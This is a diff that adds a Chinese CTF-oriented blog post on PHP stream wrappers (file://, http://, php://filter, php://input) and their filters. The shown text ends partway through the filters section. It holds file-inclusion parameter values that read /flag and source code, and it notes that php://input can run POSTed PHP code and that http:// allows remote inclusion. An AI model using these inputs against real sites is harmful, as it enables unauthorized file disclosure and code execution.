@@ -1,0 +1,1396 @@
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="light">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>常见协议与PHP伪协议 - Wells's Blog</title>
+
+  
+    <meta name="description" content="常见协议与封装协议1234567891011121 file:&#x2F;&#x2F; — 访问本地文件系统2 http:&#x2F;&#x2F; — 访问 HTTP(s) 网址3 ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs4 php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流(I&#x2F;O streams)5 zlib:&#x2F;&#x2F; — 压缩流6 data:&#x2F;&#x2F; — 数据(RFC 2397)7 glob:&#x2F;&#x2F; — 查找匹配的文件路径模式8 phar:&#x2F;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见协议与PHP伪协议">
+<meta property="og:url" content="https://wells.host/posts/b1f1aefc/">
+<meta property="og:site_name" content="Wells&#39;s Blog">
+<meta property="og:description" content="常见协议与封装协议1234567891011121 file:&#x2F;&#x2F; — 访问本地文件系统2 http:&#x2F;&#x2F; — 访问 HTTP(s) 网址3 ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs4 php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流(I&#x2F;O streams)5 zlib:&#x2F;&#x2F; — 压缩流6 data:&#x2F;&#x2F; — 数据(RFC 2397)7 glob:&#x2F;&#x2F; — 查找匹配的文件路径模式8 phar:&#x2F;&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wells.host/img/avatar.jpg">
+<meta property="article:published_time" content="2023-11-10T14:47:11.000Z">
+<meta property="article:modified_time" content="2025-08-05T09:16:33.185Z">
+<meta property="article:author" content="Wells">
+<meta property="article:tag" content="CTF-Web">
+<meta property="article:tag" content="Web-PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wells.host/img/avatar.jpg">
+  
+  
+  
+  <meta name="keywords" content="CTF-Web,Web-PHP">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="Wells's Blog" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+    <link rel="shortcut icon" href="/img/favicon.ico">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Wells","sameAs":[],"image":"/img/avatar.jpg"},"dateCreated":"2023-11-10T22:47:11+08:00","dateModified":"2025-08-05T17:16:33+08:00","datePublished":"2023-11-10T22:47:11+08:00","description":"","headline":"常见协议与PHP伪协议","mainEntityOfPage":{"@type":"WebPage","@id":"https://wells.host/posts/b1f1aefc/"},"publisher":{"@type":"Organization","name":"Wells","sameAs":[],"image":"/img/avatar.jpg","logo":{"@type":"ImageObject","url":"/img/avatar.jpg"}},"url":"https://wells.host/posts/b1f1aefc/","keywords":"CTF-Web, Web-PHP","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/img/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Wells's Blog</div><div class="sub cap">Learning Cyber Security...</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 20.536C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535" opacity="0.5"/><path fill="currentColor" d="M9.5 8.75A3.25 3.25 0 1 0 12.75 12a.75.75 0 0 1 1.5 0A4.75 4.75 0 1 1 9.5 7.25a.75.75 0 0 1 0 1.5"/><path fill="currentColor" d="M17.75 12a3.25 3.25 0 0 1-3.25 3.25a.75.75 0 0 0 0 1.5A4.75 4.75 0 1 0 9.75 12a.75.75 0 0 0 1.5 0a3.25 3.25 0 0 1 6.5 0"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper markdown"><div class="widget-header dis-select"><span class="name">无限进步<<<</span></div><div class="widget-body fs14"><p>少年应有鸿鹄志，当骑骏马踏平川</p>
+</div></widget>
+
+<widget class="widget-wrapper linklist"><div class="widget-body fs14">
+<div class="linklist left" style="grid-template-columns:repeat(1,1fr);">
+<a class="link" title="Web安全" href="/categories/web"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M3.378 5.082C3 5.62 3 7.22 3 10.417v1.574c0 5.638 4.239 8.375 6.899 9.536c.721.315 1.082.473 2.101.473c1.02 0 1.38-.158 2.101-.473C16.761 20.365 21 17.63 21 11.991v-1.574c0-3.198 0-4.797-.378-5.335c-.377-.537-1.88-1.052-4.887-2.081l-.573-.196C13.595 2.268 12.812 2 12 2s-1.595.268-3.162.805L8.265 3c-3.007 1.03-4.51 1.545-4.887 2.082" opacity="0.5"/><path fill="currentColor" fill-rule="evenodd" d="M6.688 9.8a5.75 5.75 0 1 0 10.625 4.4A5.75 5.75 0 0 0 6.688 9.8m5.256-2.032A.1.1 0 0 1 12 7.75c.004 0 .021 0 .056.018a.7.7 0 0 1 .17.134c.153.158.328.431.492.841c.162.404.296.901.39 1.466q.083.502.118 1.041h-2.452q.035-.539.118-1.04a7 7 0 0 1 .39-1.467c.164-.41.34-.683.492-.841a.7.7 0 0 1 .17-.134M9.412 9.964c-.068.415-.116.847-.14 1.286H7.816a4.25 4.25 0 0 1 2.01-2.903a9 9 0 0 0-.415 1.617M7.817 12.75H9.27c.025.439.073.871.141 1.286a9 9 0 0 0 .415 1.617a4.25 4.25 0 0 1-2.01-2.903m8.366-1.5a4.25 4.25 0 0 0-2.01-2.903c.18.486.318 1.034.415 1.617c.068.415.116.847.14 1.286zm-1.454 1.5h1.454a4.25 4.25 0 0 1-2.01 2.903c.18-.486.318-1.034.415-1.617c.068-.415.116-.847.14-1.286m-1.503 0a11 11 0 0 1-.118 1.04a7 7 0 0 1-.39 1.467c-.164.41-.34.683-.492.841a.7.7 0 0 1-.17.134a.1.1 0 0 1-.056.018c-.004 0-.021 0-.056-.018a.7.7 0 0 1-.17-.134c-.153-.158-.328-.431-.492-.841a7 7 0 0 1-.39-1.466a11 11 0 0 1-.118-1.041z" clip-rule="evenodd"/></svg><span>Web安全</span></div></a>
+<a class="link" title="渗透测试" href="/categories/penetration"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none"><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M14 21.71A7 7 0 0 1 5 15v-3.062A3.94 3.94 0 0 1 8.938 8h6.124A3.94 3.94 0 0 1 19 11.938V15a6.98 6.98 0 0 1-2 4.899"/><path fill="currentColor" d="M8.25 7.5a.75.75 0 0 0-1.5 0zm-.615-2.917a.75.75 0 1 0 1.246.834zM17.25 8.5v-1h-1.5v1zm-10.5-1v1h1.5v-1zm10.5 0c0-2.9-2.35-5.25-5.25-5.25v1.5a3.75 3.75 0 0 1 3.75 3.75zM12 2.25a5.25 5.25 0 0 0-4.365 2.333l1.246.834A3.75 3.75 0 0 1 12 3.75z"/><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M19 14h3M5 14H2M14.5 3.5L17 2M9.5 3.5L7 2m13.5 18l-2-.8m2-11.2l-2 .8M3.5 20l2-.8M3.5 8l2 .8M12 21.5V15"/></g></svg><span>渗透测试</span></div></a>
+<a class="link" title="代码审计" href="/categories/code-audit"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path d="m17 7.83l1.697 1.526c1.542 1.389 2.313 2.083 2.313 2.974c0 .89-.771 1.585-2.314 2.973L17 16.83"/><path d="m13.987 5l-3.974 14.83" opacity="0.5"/><path d="M7 7.83L5.304 9.356C3.76 10.745 2.99 11.44 2.99 12.33s.771 1.585 2.314 2.973L7 16.83"/></g></svg><span>代码审计</span></div></a>
+<a class="link" title="电子取证" href="/categories/forensics"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M10 20h3.627a5.25 5.25 0 1 1 8.369-6.34Q22 12.9 22 12c0-.442 0-1.608-.002-2H2.002C2 10.392 2 11.558 2 12c0 3.771 0 5.657 1.172 6.828S6.229 20 10 20" opacity="0.5"/><path fill="currentColor" d="M5.25 16a.75.75 0 0 1 .75-.75h4a.75.75 0 0 1 0 1.5H6a.75.75 0 0 1-.75-.75"/><path fill="currentColor" fill-rule="evenodd" d="M17.75 14.5a2.25 2.25 0 1 0 0 4.5a2.25 2.25 0 0 0 0-4.5M14 16.75a3.75 3.75 0 1 1 6.879 2.068l.901.902a.75.75 0 1 1-1.06 1.06l-.902-.901A3.75 3.75 0 0 1 14 16.75" clip-rule="evenodd"/><path fill="currentColor" d="M9.995 4h4.01c3.781 0 5.672 0 6.846 1.116c.846.803 1.083 1.96 1.149 3.884v1H2V9c.066-1.925.303-3.08 1.149-3.884C4.323 4 6.214 4 9.995 4"/></svg><span>电子取证</span></div></a>
+<a class="link" title="工具手册" href="/categories/tools"><div class="flex"><?xml version="1.0" encoding="UTF-8"?><svg width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M44 16C44 22.6274 38.6274 28 32 28C29.9733 28 28.0639 27.4975 26.3896 26.6104L9 44L4 39L21.3896 21.6104C20.5025 19.9361 20 18.0267 20 16C20 9.37258 25.3726 4 32 4C34.0267 4 35.9361 4.50245 37.6104 5.38959L30 13L35 18L42.6104 10.3896C43.4975 12.0639 44 13.9733 44 16Z" fill="none" stroke="#333" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>工具手册</span></div></a></div></div></widget>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/posts/5ae37a88/"><span class="title">数据库提权中的字符集挑战</span></a><a class="item title" href="/posts/72baa392/"><span class="title">Yakit插件开发</span></a><a class="item title" href="/posts/b1f1aefc/"><span class="title">常见协议与PHP伪协议</span></a><a class="item title" href="/posts/e85eefb/"><span class="title">SQL Server下SQL注入的应用</span></a><a class="item title" href="/posts/e73517db/"><span class="title">SQL注入</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/we11s" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" href="/about/#comments" rel="noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/942ebbf1a4b91.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/web/">web</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-11-10T14:47:11.000Z">2023-11-10</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-08-05T09:16:33.185Z">2025-08-05</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>常见协议与PHP伪协议</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="常见协议与封装协议"><a href="#常见协议与封装协议" class="headerlink" title="常见协议与封装协议"></a><strong>常见协议与封装协议</strong></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="number">2</span> http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="number">3</span> ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="number">4</span> php:<span class="comment">// — 访问各个输入/输出流(I/O streams)</span></span><br><span class="line"><span class="number">5</span> zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="number">6</span> data:<span class="comment">// — 数据(RFC 2397)</span></span><br><span class="line"><span class="number">7</span> glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="number">8</span> phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="number">9</span> ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="number">10</span> rar:<span class="comment">// — RAR</span></span><br><span class="line"><span class="number">11</span> ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="number">12</span> expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p>访问本地文件系统，若不加协议名称，<strong>默认封装协议</strong>为<code>file://</code>协议</p>
+<p><strong>条件：</strong></p>
+<ul>
+<li>allow_url_fopen:off&#x2F;on</li>
+<li>allow_url_include :off&#x2F;on</li>
+</ul>
+<p><strong>作用：</strong><br>用于访问本地文件系统（服务器中的文件），在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。</p>
+<p><strong>说明：</strong><br><strong>当不说明使用file:&#x2F;&#x2F;协议的时（即默认file:&#x2F;&#x2F;协议的情况）可以使用相对路径，当使用了file协议时无法使用相对路径。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd=file://flag #用法错误，声明file协议时无法使用相对路径</span><br><span class="line">cmd=file:///flag #用法正确，使用绝对路径</span><br><span class="line">cmd=/flag #用法正确，使用绝对路径</span><br><span class="line">cmd=flag #用法正确，使用相对路径</span><br></pre></td></tr></table></figure>
+
+<p><strong>相对路径</strong></p>
+<p>当指定了一个<strong>相对路径</strong>提供的路径将基于<strong>当前的目录</strong>。在很多情况下是脚本所在的目录。</p>
+<ul>
+<li><p>Windows：不以:&#x2F;&#x2F;indows 盘符开头的路径</p>
+</li>
+<li><p>Linux:不以&#x2F;开头的路径</p>
+</li>
+</ul>
+<p><strong>使用示例</strong>：以传参变量名为cmd演示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux</span></span><br><span class="line">cmd=file:<span class="comment">///path/to/flag #根目录下path文件夹中to文件夹下flag文件 ——此处有///三条</span></span><br><span class="line">cmd=/path/to/flag <span class="comment">#根目录下path文件夹中to文件夹下flag文件</span></span><br><span class="line">cmd=relative/path/flag <span class="comment">#当前目录下relative文件夹中path文件夹下flag文件</span></span><br><span class="line">cmd=flag <span class="comment">#当前目录下的flag文件</span></span><br><span class="line"><span class="comment">#Windows</span></span><br><span class="line">cmd=file:<span class="comment">//C:/path/to/flag #C盘中path文件夹中to文件夹下flag文件</span></span><br><span class="line">cmd=file:<span class="comment">//C:\path\to\flag #C盘中path文件夹中to文件夹下flag文件</span></span><br><span class="line">cmd=C:\path\to\flag <span class="comment">#C盘中path文件夹中to文件夹下flag文件</span></span><br><span class="line">cmd=flag  <span class="comment">#当前文件夹下flag文件</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="http"><a href="#http" class="headerlink" title="http:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;</h2><p> 访问 HTTP(s) 网址</p>
+<p><strong>条件：</strong></p>
+<ul>
+<li>allow_url_fopen:on</li>
+<li>allow_url_include:on</li>
+</ul>
+<p><strong>作用：</strong><br>常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于<strong>远程包含。</strong></p>
+<p><strong>使用示例</strong>：以传参变量名为cmd演示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=http:<span class="comment">//example.com/phpinfo.txt	#读取http://example.com/phpinfo.txt文件</span></span><br><span class="line">cmd=https:<span class="comment">//example.com/file.php?var1=val1&amp;var2=val2	#读取https://example.com/file.php文件并且传入var1和var2的值</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p> 访问各个输入&#x2F;输出流(I&#x2F;O streams)，伪协议提供了多种不同的方式来访问和处理数据</p>
+<p><strong>常见的PHP伪协议：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php://input #这个伪协议用于访问HTTP请求的原始主体数据。它通常用于从POST请求中读取数据。</span><br><span class="line">php://output #这个伪协议用于访问HTTP响应的输出流。它通常用于向客户端发送数据。</span><br><span class="line">php://stdin #用于访问标准输入流。</span><br><span class="line">php://stdout #用于访问标准输出流。</span><br><span class="line">php://stderr #用于访问标准错误输出流。</span><br><span class="line">php://temp #用于临时存储数据的内存流。它可以用于在没有创建实际文件的情况下处理临时数据。</span><br><span class="line">php://memory #用于在内存中创建可读写的数据流。</span><br><span class="line">php://filter #这个伪协议用于数据过滤和转换。它允许您将不同的过滤器应用于数据流，例如Base64编码、压缩和加密等。</span><br><span class="line">php://globals #用于访问全局变量。可以通过此伪协议查看和修改PHP全局变量的值。</span><br><span class="line">php://fd #用于访问文件描述符。它允许您在PHP中访问底层文件系统。</span><br></pre></td></tr></table></figure>
+
+<p>在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>、<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行POST参数中的php代码。</p>
+<p><strong>作用：</strong><br>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流(I&#x2F;O streams)</p>
+<p><strong>条件：</strong></p>
+<ul>
+<li>allow_url_fopen:off&#x2F;on</li>
+<li>allow_url_include :仅<code>php://input</code> 、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要on</li>
+</ul>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><strong>php:&#x2F;&#x2F;filter</strong></h3><p><strong>条件：</strong></p>
+<ul>
+<li>allow_url_fopen:off&#x2F;on</li>
+<li>allow_url_include :off&#x2F;on</li>
+</ul>
+<p><strong>作用：</strong></p>
+<p><code>php://filter</code>可以作为一个位于原始数据流和最终目标之间的中间流来处理其他流，负责对数据进行处理。（即读取或写入数据之前对其进行修改或过滤。）</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
+<td>这个参数是必须的。它指定了你要筛选过滤的数据流。（<strong>加绝对路径</strong>）</td>
+</tr>
+<tr>
+<td>read&#x3D;&lt;读链的筛选列表&gt;</td>
+<td>read参数指定 一个或多个过滤器 用于<strong>读</strong>操作，可以设定一个或多个过滤器名称，以管道符分隔。（读取文件后编码输出）</td>
+</tr>
+<tr>
+<td>write&#x3D;&lt;写链的筛选列表&gt;</td>
+<td>write参数指定 一个或多个过滤器 用于<strong>写</strong>操作，可以设定一个或多个过滤器名称，以管道符分隔。（编码重写入文件）</td>
+</tr>
+<tr>
+<td>&lt;；两个链的筛选列表&gt;</td>
+<td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表<strong>会视情况应用于读或写链</strong>。</td>
+</tr>
+</tbody></table>
+<p>注：</p>
+<ul>
+<li><code>read</code> 和 <code>write</code> 指令是互斥的，不能同时使用。</li>
+<li>如果存在多个过滤器，字符串从左到右的顺序经过过滤器</li>
+</ul>
+<p><code>write</code>指令用于写入文件，对字符串编码后写入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* 将 &quot;Hello World&quot; 进行base64编码然后写入根目录flag.txt文件 */</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;php://filter/write=convert.base64-encode/resource=/flag.txt&quot;</span>,<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>常用过滤语句：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php:<span class="comment">//filter/read=convert.base64-encode/resource=/flag //读取根目录flag文件，进行base64编码</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="常用过滤器"><a href="#常用过滤器" class="headerlink" title="常用过滤器"></a><strong>常用过滤器</strong></h4><blockquote>
+<p>PHP 版本中的过滤器也许比这里列出的更多（或更少），可用 <code>stream_get_filters()</code>来列出 PHP 中已安装的过滤器。</p>
+<p>以docker的PHP8.3.4为例，自带的过滤器有</p>
+<ul>
+<li>zlib.* </li>
+<li>convert.iconv.*</li>
+<li>string.rot13 </li>
+<li>string.toupper</li>
+<li>string.tolower</li>
+<li>convert.* </li>
+<li>dechunk</li>
+<li>consumed (目前也不知道是啥)</li>
+</ul>
+</blockquote>
+<h5 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a><strong>字符串过滤器</strong></h5><ul>
+<li><p><code>string.rot13</code>（对字符串执行<code>ROT13</code>编码转换）</p>
+</li>
+<li><p><code>string.toupper</code>（将字符串转化为大写）</p>
+</li>
+<li><p><code>string.tolower</code>（将字符串转化为小写）</p>
+</li>
+<li><p><code>string.strip_tags</code>(自 PHP 7.3.0 起废弃，从字符串中去除 HTML 和 PHP 标记)</p>
+</li>
+</ul>
+<blockquote>
+<p>官方文档：</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.string.php">PHP: 字符串过滤器 - Manual</a></p>
+</blockquote>
+<h5 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a><strong>转换过滤器</strong></h5><p>注：转换过滤器是 PHP 5.0.0 添加的</p>
+<ul>
+<li><code>convert.base64-encode</code>和<code> convert.base64-decode</code>（将字符串进行base64编码加解密）</li>
+<li><code>convert.quoted-printable-encode</code> 和 <code>convert.quoted-printable-decode</code>（将字符串进行Quoted-printable编码加解密）<ul>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/235588441">Quoted-Printable 编码 - 知乎 (zhihu.com)</a></li>
+</ul>
+</li>
+<li><code>convert.iconv.*</code>（将字符串进行字符编码转化）</li>
+</ul>
+<blockquote>
+<p>官方文档：</p>
